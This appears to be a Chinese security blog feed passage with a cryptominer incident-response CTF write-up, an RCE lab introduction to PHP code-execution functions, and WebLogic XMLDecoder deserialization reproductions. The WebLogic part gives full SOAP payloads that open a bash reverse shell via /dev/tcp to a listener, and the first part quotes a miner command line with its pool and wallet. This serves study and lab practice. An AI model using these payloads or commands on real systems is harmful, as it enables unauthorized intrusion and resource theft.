plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:start</span><br></pre></td></tr></tbody></table></figure><ul><li>定义一个标签 <code>:start</code>，用于循环跳转。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlwpr.exe -a rx/0 --url b.oracleservice.top --user 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -t 0</span><br></pre></td></tr></tbody></table></figure><ul><li><strong><code>sqlwpr.exe</code></strong> 是一个 <strong>加密货币挖矿程序</strong>（可能是恶意软件）。</li><li><strong>参数解析</strong>：<ul><li><code>-a rx/0</code>：指定挖矿算法（<code>RandomX</code>，常用于门罗币 Monero/XMR 挖矿）。</li><li><code>--url b.oracleservice.top</code>：连接到的<u>矿池服务器地址</u>（矿工提交算力并获取奖励）。</li><li><code>--user 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</code>：挖矿钱包地址（收益归攻击者所有）。</li><li><code>-t 0</code>：使用所有可用的 CPU 线程挖矿（最大化资源占用）。</li></ul></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goto start</span><br></pre></td></tr></tbody></table></figure><ul><li>跳回 <code>:start</code> 标签，形成无限循环，确保挖矿程序持续运行（即使崩溃也会重启）。</li></ul><p><strong>所以 恶意域名是矿池服务器地址</strong></p><h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><ol><li><strong>这是一个隐蔽的恶意挖矿脚本</strong>：<ul><li>通过 <code>@echo off</code> 和隐藏窗口运行（结合之前的 VBScript）来避免被发现。</li><li>无限循环确保挖矿程序长期驻留。</li></ul></li><li><strong>使用的技术</strong>：<ul><li><strong><code>RandomX</code> 算法</strong>（<code>rx/0</code>）通常用于 <strong>门罗币（XMR）</strong> 挖矿。</li><li>矿池地址 <code>b.oracleservice.top</code> 可能是攻击者控制的服务器。</li><li>钱包地址 <code>46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</code> 用于接收挖矿收益。</li></ul></li><li><strong>影响</strong>：<ul><li><strong>CPU 资源占用极高</strong>，导致系统变卡、发热增加。</li><li>长期运行会增加电费消耗，并可能缩短硬件寿命。</li><li>可能是通过木马或漏洞植入的（如恶意软件、钓鱼攻击等）。</li></ul></li></ol><h3 id="应对措施"><a href="#应对措施" class="headerlink" title="应对措施"></a><strong>应对措施</strong></h3><ol><li><strong>立即终止恶意进程</strong>：<ul><li>打开任务管理器（Ctrl+Shift+Esc），结束 <code>sqlwpr.exe</code> 和 <code>wscript.exe</code> 进程。</li><li>检查后台程序，关闭可疑项目。</li></ul></li><li><strong>删除相关文件</strong>：<ul><li>找到脚本所在目录（<code>%~dp0</code>），删除 <code>sqlwscript.cmd</code> 和 <code>sqlwpr.exe</code>。</li><li>检查启动项（<code>msconfig</code> 或 <code>任务管理器 &gt; 启动</code>），移除恶意条目。</li></ul></li><li><strong>安全防护</strong>：<ul><li>使用杀毒软件（如 Windows Defender、Malwarebytes）全盘扫描。</li><li>检查系统是否被植入其他后门（如远控木马）。</li></ul></li><li><strong>防止再次感染</strong>：<ul><li>不要随意运行来历不明的脚本或程序。</li><li>保持系统和软件更新，修补安全漏洞。</li></ul></li></ol><h2 id="4-疑似是什么组织发动的攻击？"><a href="#4-疑似是什么组织发动的攻击？" class="headerlink" title="4 疑似是什么组织发动的攻击？"></a>4 疑似是什么组织发动的攻击？</h2><blockquote><p>题目描述：flag格式为：flag{123XXX}（无空格注意大小写）</p></blockquote><p>搜索恶意域名，发现是8220挖矿组织</p><img src="https://pic1.imgdb.cn/item/683c6c6358cb8da5c82187f2.png" style="zoom:50%;"><p>继续搜索8220挖矿组织，搜到其全名</p><img src="https://pic1.imgdb.cn/item/683c6cbd58cb8da5c821881f.png" style="zoom:50%;"><p><strong>最终 该组织为8220 Gang</strong></p><h2 id="5-攻击者C2服务器IP是什么？"><a href="#5-攻击者C2服务器IP是什么？" class="headerlink" title="5 攻击者C2服务器IP是什么？"></a>5 攻击者C2服务器IP是什么？</h2><blockquote><p>题目描述：flag格式为：flag{123.123.123.123}</p></blockquote><p>查看挖矿程序的上传时间，确定时间大概在2025.5.27 23:20:00左右</p><p><img src="https://pic1.imgdb.cn/item/683c76bc58cb8da5c8218bc0.png"></p><p>查询windows的安全日志，筛选 <code>5156</code> 事件（Windows 过滤平台放行连接），逐一查询这段时间之后powershell的出战痕迹</p><p>当然，也可以直接导出筛选日志进行关键词搜索</p><p>将已筛选的日志导出为txt文件，然后直接搜索powershell.exe关键词，找出可疑的出站目的IP地址，即为C2服务器IP</p><p><img src="https://pic1.imgdb.cn/item/683c718a58cb8da5c8218a94.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE-labs</title>
      <link href="/2025/05/26/rce-labs/"/>
      <url>/2025/05/26/rce-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE-labs"><a href="#RCE-labs" class="headerlink" title="RCE-labs"></a>RCE-labs</h1><h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>— HelloCTF - RCE靶场 : 代码执行&amp;命令执行 — </p><p>「任意代码执行(Arbitrary Code Execution,ACE)」 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。</p><p>在此基础上我们将通过网络触发任意代码执行的能力通常称为 远程代码执行 「远程代码执行(RCE,Remote Code Execution,RCE)」。</p><p>「命令执行(Command Execution)」 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的<code>shell_exec()</code>函数或Python中的<code>os.system()</code>函数。</p><p>「代码执行(Code Execution)」 同我们最开始说到的任意代码执行，在语言中可以体现为一些函数或者方法调用，如PHP中的<code>eval()</code>函数或Python中的<code>exec()</code>函数。</p><p>虽然在很多教学场景，命令执行 和 代码执行 经常被用同一个缩写 RCE (Remote Code/Command Execution) 来指代，但显而易见的是，代码执行是更为广泛的概念。</p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>— HelloCTF - RCE靶场 : 一句话木马和代码执行 —<br>「代码执行(Code Execution)」 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的<code>eval()</code>函数或Python中的<code>exec()</code>函数。</p><p>当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 eval(“system(‘cat /etc/passwd’)”;); 也被归为代码执行漏洞。</p><p>我们平时最常见的一句话木马就用的 <strong>eval() 函数</strong>，如下所示（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try POST:  </span><br><span class="line">a=echo "Hello,World!";</span><br></pre></td></tr></tbody></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>— HelloCTF - RCE靶场 : PHP代码执行函数 — </p><p>除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 <strong>回调函数</strong> 也可以直接或者间接的执行PHP代码。</p><p>在该关卡中，你将会从能够执行代码的PHP函数中抽取一个，你需要填充函数的内容来执行某些代码以获取flag（tip:flag存储在 $flag 中,当然你也可以尝试其他方法）。</p><p>可以执行PHP代码的函数如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">call_user_func()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func_array()</span><br><span class="line">usort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">preg_replace()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic反序列化漏洞</title>
      <link href="/2025/04/23/weblogic-fan-xu-lie-hua-lou-dong/"/>
      <url>/2025/04/23/weblogic-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h1><h2 id="WeblogicXMLdecoder反序列化"><a href="#WeblogicXMLdecoder反序列化" class="headerlink" title="WeblogicXMLdecoder反序列化"></a>WeblogicXMLdecoder反序列化</h2><h3 id="1-XMLDecode-反序列化"><a href="#1-XMLDecode-反序列化" class="headerlink" title="1. XMLDecode 反序列化"></a>1. XMLDecode 反序列化</h3><h4 id="1-1-XMLEncoder-XMLDecoder"><a href="#1-1-XMLEncoder-XMLDecoder" class="headerlink" title="1.1 XMLEncoder&amp;XMLDecoder"></a>1.1 XMLEncoder&amp;XMLDecoder</h4><p>XMLDecoder/XMLEncoder是在JDK1.4版中添加的XML格式序列化持久性方案，使用XMLEncoder来生成表示JavaBeans组件(bean)的XML文档，用XMLDecoder读取使用XMLEncoder创建的XML文档获取JavaBeans。</p><h4 id="1-2-XML标签"><a href="#1-2-XML标签" class="headerlink" title="1.2 XML标签"></a>1.2 XML标签</h4><ol><li>string标签</li></ol><p>​字符串“Hello,world”表示如下:</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>object标签</li></ol><p>​通过<object>标签表示对象，其class属性指定具体类(用于调用其内部方法)，method属性指定具体方法名称(比如构造函数的的方法名为 new )。<p></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">"Hello,worIld"</span>);<span class="comment">//等价于 JButton jb = new JButton("Hello,worIld");</span></span><br></pre></td></tr></tbody></table></figure><p>对应的XML文档如下:</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"javax.swing.JButton"</span> <span class="attr">method</span>=<span class="string">"new"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span>;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>void标签</li></ol><p>​通过<void>标签表示函数调用、赋值等操作，method属性指定具体的方法名称。</void></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JButton</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>();</span><br><span class="line">b.setText(<span class="string">"Hello, worId"</span>); </span><br></pre></td></tr></tbody></table></figure><p>对应的XML文档如下:</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"javax.swing.JButton"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"setText"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>4.array标签<br>通过<array>标签表示数组，class属性指定具体类，在array标签内部使用void标签的index属性来指定数组索引赋值。</array></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">2</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">"Hello,world"</span>;</span><br></pre></td></tr></tbody></table></figure><p>对应的XML文档如下:</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">1ength</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="1-3-WeblogicXMLdecoder反序列化实例"><a href="#1-3-WeblogicXMLdecoder反序列化实例" class="headerlink" title="1.3 WeblogicXMLdecoder反序列化实例"></a>1.3 WeblogicXMLdecoder反序列化实例</h4><p>XML文档：</p><p>java头指定java版本和使用的XMLDecoder类，用来进行xml文档反序列化</p><p>object对象指定创建进程的类（ProcessBuilder），可以用于命令执行</p><p>array数组长度为1，传入的值为calc（计算器）</p><p>然后再调用start方法</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(s[<span class="number">0</span>]);</span><br><span class="line">String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">0</span>] = <span class="string">"calc"</span>;</span><br><span class="line">pb.start();</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6808ece858cb8da5c8c6a5f6.png"></p><p>Test.java：</p><p><img src="https://pic1.imgdb.cn/item/6808ed5c58cb8da5c8c6a610.png"></p><p>把poc.xml的xml文档传入，调用a.readObject反序列化成对象，然后运行系统命令，弹出计算器</p><h3 id="2-CVE-2017-3506-xml数据无校验"><a href="#2-CVE-2017-3506-xml数据无校验" class="headerlink" title="2. CVE-2017-3506(xml数据无校验)"></a>2. CVE-2017-3506(xml数据无校验)</h3><h4 id="2-1-漏洞简介"><a href="#2-1-漏洞简介" class="headerlink" title="2.1 漏洞简介"></a>2.1 漏洞简介</h4><p>​WebLogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的SOAP(XML)数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>影响版本：10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2</p><h4 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h4><h5 id="2-2-1-判断漏洞存在"><a href="#2-2-1-判断漏洞存在" class="headerlink" title="2.2.1 判断漏洞存在"></a>2.2.1 判断漏洞存在</h5><p>若访问/wls-wsat/CoordinatorPortType，出现如下页面，则可能存在此漏洞。</p><p><img src="https://pic1.imgdb.cn/item/6808f95858cb8da5c8c6aa9d.png"></p><p>只要在wls-wsat这个war包中的uri皆受到影响，打开web.xml查看所有受到影响的uri路径。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">默认受到影响的uri如下：</span><br><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></tbody></table></figure><h4 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h4><p>​访问<a href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST，而后修改</a> Content-Type为text/xml。</p><p>在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xm1ns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">1ength</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.219.134/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>注意：反弹shell命令中的&gt;&amp;转换成了实体编码&amp;gt;&amp;amp;</strong></p><p>在kali中使用nc监听4444端口。</p><h3 id="3-CVE-2017-10271（黑名单过滤object标签，void标签绕过）"><a href="#3-CVE-2017-10271（黑名单过滤object标签，void标签绕过）" class="headerlink" title="3. CVE-2017-10271（黑名单过滤object标签，void标签绕过）"></a>3. CVE-2017-10271（黑名单过滤object标签，void标签绕过）</h3><h4 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h4><p>​在更新CVE-2017-3506补丁之前，不对用户输入的SOAP(XML)数据进行验证，在其中使用object标签就可以进行远程命令执行，CVE-2017-3506的补丁在weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法，在解析xml时，Element字段出现object标签就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式与CVE-2017-3506类似，使用了void标签绕过CVE-2017-3506的补丁，从而进行远程命令执行。</p><p>影响版本:10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2</p><h4 id="3-2-漏洞复现"><a href="#3-2-漏洞复现" class="headerlink" title="3.2 漏洞复现"></a>3.2 漏洞复现</h4><p>​CVE-2017-10271与CVE-2017-3506的复现过程相似,只不过**<u>需要将objec标签替换成void</u>**进行利用。访问<a href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType%EF%BC%8C%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%BAPOST,%E8%80%8C%E5%90%8E%E4%BF%AE%E6%94%B9Content-Type%E4%B8%BAtext/xml%E3%80%82">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST,而后修改Content-Type为text/xml。</a><br>​在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.219.134/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在kali中使用nc监听4444端口。</p><h5 id="3-2-1-复现过程"><a href="#3-2-1-复现过程" class="headerlink" title="3.2.1 复现过程"></a>3.2.1 复现过程</h5><p>访问网页，出现此页面，表示存在漏洞</p><p><img src="https://pic1.imgdb.cn/item/6809070158cb8da5c8c6b5dd.png"></p><p>bp抓包，修改请求方法为POST，而后修改Content-Type为text/xml，然后写入payload</p><p>原始包：</p><p><img src="https://pic1.imgdb.cn/item/680907aa58cb8da5c8c6b6b5.png"></p><p>修改后包：</p><p><img src="https://pic1.imgdb.cn/item/680908b158cb8da5c8c6b753.png"></p><p>响应包返回500</p><p>kali上开启监听4444端口，并收到反弹的shell</p><p><img src="https://pic1.imgdb.cn/item/680908ff58cb8da5c8c6b78c.png"></p><h3 id="4-CVE-2019-2725（新路径，依旧无校验）"><a href="#4-CVE-2019-2725（新路径，依旧无校验）" class="headerlink" title="4. CVE-2019-2725（新路径，依旧无校验）"></a>4. CVE-2019-2725（新路径，依旧无校验）</h3><h4 id="4-1-漏洞介绍"><a href="#4-1-漏洞介绍" class="headerlink" title="4.1 漏洞介绍"></a>4.1 漏洞介绍</h4><p>该漏洞依l日是根据weblogic的xmldecoder反序列化漏洞，WebLogic部分版本中默认包含wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意HTTP请求，获得目标服务器的权限，在未授权的情况下远程执行命令。</p><p>影响版本:10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0</p><h4 id="4-2-漏洞分析"><a href="#4-2-漏洞分析" class="headerlink" title="4.2 漏洞分析"></a>4.2 漏洞分析</h4><p>CVE-2019-2725漏洞与前两个漏洞相似，只不过利用的是wIs9_async_response这个war包，若访问/_async/AsyncResponseService，响应如下页面，则可能存在该漏洞。</p><p><img src="https://pic1.imgdb.cn/item/68090e4258cb8da5c8c6bac3.png"></p><p>若访问/_async/，响应403，也可能存在漏洞。</p><p><img src="https://pic1.imgdb.cn/item/68090e5858cb8da5c8c6bac5.png"></p><p>只要是在bea_wls9_async_response包中的uri皆受到影响，可以打开web.xml查看所有受到影响的uri。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认受影响的uri：</span><br><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttp</span><br><span class="line">返回页面均为上面的页面</span><br></pre></td></tr></tbody></table></figure><h4 id="4-3-漏洞复现"><a href="#4-3-漏洞复现" class="headerlink" title="4.3 